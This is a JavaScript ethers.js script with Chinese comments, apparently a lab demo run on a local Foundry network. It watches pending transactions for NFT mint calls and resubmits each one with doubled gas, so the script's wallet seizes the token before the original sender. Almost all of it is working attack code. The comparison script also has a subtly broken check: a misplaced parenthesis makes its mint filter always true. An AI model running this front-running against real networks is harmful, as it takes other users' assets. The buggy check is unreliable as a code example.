//1.连接到foundry本地网络
import { ethers } from "ethers";
const provider = new ethers.providers.WebSocketProvider('http://127.0.0.1:8545')
let network = provider.getNetwork()
network.then(res => console.log(`[${(new Date).toLocaleTimeString()}]链接到网络${res.chainId}`))

//2.构建contract实例
const contractABI = [
    "function mint() public",
    "function ownerOf(uint256) public view returns (address) ",
    "function totalSupply() view returns (uint256)"
]
const contractAddress = '0xC76A71C4492c11bbaDC841342C4Cb470b5d12193'
const contractFM = new ethers.Contract(contractAddress, contractABI, provider)

//3.创建Interface对象，用于检索mint函数。
const iface = new ethers.utils.Interface(contractABI)
function getSignature(fn) {
    return iface.getSighash(fn)
}

//4. 创建测试钱包，用于发送抢跑交易，私钥是foundry测试网提供
const privateKey = '0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80'
const wallet = new ethers.Wallet(privateKey, provider)

//5. 构建正常mint函数，检验mint结果，显示正常。
const normaltx = async () => {
    provider.on('pending', async (txHash) => {
        provider.getTransaction(txHash).then(
            async (tx) => {
                if (tx.data.indexOf(getSignature("mint") !== -1)) {
                    console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}`)
                    console.log(`铸造发起的地址是:${tx.from}`)
                    await tx.wait()
                    const tokenId = await contractFM.totalSupply()
                    console.log(`mint的NFT编号:${tokenId}`)
                    console.log(`编号${tokenId}NFT的持有者是${await contractFM.ownerOf(tokenId)}`)
                    console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(tokenId)}`)
                }
            }
        )
    })
}

//6.构建抢跑交易，检验mint结果，抢跑成功！
const frontRun = async () => {
    provider.on('pending', async (txHash) => {
        const tx = await provider.getTransaction(txHash)
        if (tx.data.indexOf(getSignature("mint")) !== -1 && tx.from !== wallet.address) {
            console.log(`[${(new Date).toLocaleTimeString()}]监听到交易:${txHash}\n准备抢先交易`)
            const frontRunTx = {
                to: tx.to,
                value: tx.value,
                maxPriorityFeePerGas: tx.maxPriorityFeePerGas.mul(2),
                maxFeePerGas: tx.maxFeePerGas.mul(2),
                gasLimit: tx.gasLimit.mul(2),
                data: tx.data
            }
            const aimTokenId = (await contractFM.totalSupply()).add(1)
            console.log(`即将被mint的NFT编号是:${aimTokenId}`)//打印应该被mint的nft编号
            const sentFR = await wallet.sendTransaction(frontRunTx)
            console.log(`正在frontrun交易`)
            const receipt = await sentFR.wait()
            console.log(`frontrun 交易成功,交易hash是:${receipt.transactionHash}`)
            console.log(`铸造发起的地址是:${tx.from}`)
            console.log(`编号${aimTokenId}NFT的持有者是${await contractFM.ownerOf(aimTokenId)}`)//刚刚mint的nft持有者并不是tx.from
            console.log(`编号${aimTokenId.add(1)}的NFT的持有者是:${await contractFM.ownerOf(aimTokenId.add(1))}`)//tx.from被wallet.address抢跑，mint了下一个nft
            console.log(`铸造发起的地址是不是对应NFT的持有者:${tx.from === await contractFM.ownerOf(aimTokenId)}`)//比对地址，tx.from被抢跑
            //检验区块内数据结果
            const block = await provider.getBlock(tx.blockNumber)
            console.log(`区块内交易数据明细:${block.transactions}`)//在区块内，后发交易排在先发交易前，抢跑成功。
        }
    })
}


frontRun()
//normaltx()
